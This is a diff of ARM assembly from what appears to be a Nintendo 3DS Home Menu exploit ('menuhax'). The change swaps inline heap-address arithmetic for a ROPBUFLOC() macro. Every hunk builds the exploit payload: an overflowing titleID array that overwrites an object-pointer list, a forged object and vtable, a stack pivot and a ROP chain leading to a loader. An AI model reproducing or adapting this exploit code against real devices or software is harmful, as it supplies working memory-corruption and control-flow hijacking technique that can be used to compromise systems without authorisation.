@@ -10,26 +10,26 @@ _start:
 
 @ End of the titleID array - TOTAL_HAX_ICONS.
 .fill (((_start + 0x8 + ((360-TOTAL_HAX_ICONS)*8)) - .) / 4), 4, 0xffffffff
-.word HEAPBUF + (object - _start), 0x55667788 @ These two words(as a "titleID") overwrite the target_objectslist_buffer. The rest of the "titleIDs" here aren't used by Home Menu due to the s16 values below. This buffer contains a list of object-ptrs which gets used with a vtable-funcptr +16 call. This jumps to ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR.
+.word ROPBUFLOC(object), 0x55667788 @ These two words(as a "titleID") overwrite the target_objectslist_buffer. The rest of the "titleIDs" here aren't used by Home Menu due to the s16 values below. This buffer contains a list of object-ptrs which gets used with a vtable-funcptr +16 call. This jumps to ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR.
 
 ropstackstart:
 #include "menuhax_loader.s"
 
 object:
-.word HEAPBUF + (vtable - _start) @ object+0, vtable ptr.
+.word ROPBUFLOC(vtable) @ object+0, vtable ptr.
 .word 0
 
 vtable: @ Overlap the object and vtable due to lack of space, since ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR uses vtable+0x28.
 .word 0
 .word 0
-.word HEAPBUF + ((object + 0x20) - _start) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
+.word ROPBUFLOC(object + 0x20) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
 .word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
 .word ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR @ vtable funcptr +16. This saves {r4-r8, lr} on the stack, then calls the funcptr from vtable+0x28 below.
 
 //.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
 
 stackpivot_sploadword:
-.word HEAPBUF + (ropstackstart - _start) @ sp
+.word ROPBUFLOC(ropstackstart) @ sp
 stackpivot_pcloadword:
 .word ROP_POPPC @ pc
 
@@ -39,7 +39,7 @@ stackpivot_pcloadword:
 
 @ objptr loaded by ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR.
 //.space ((object + 0x34) - .)
-.word HEAPBUF + (object - _start)
+.word ROPBUFLOC(object)
 
 @ Pad to the end of the titleID array, to make sure the above data doesn't get too large.
 .space ((_start + 0xb48) - .)
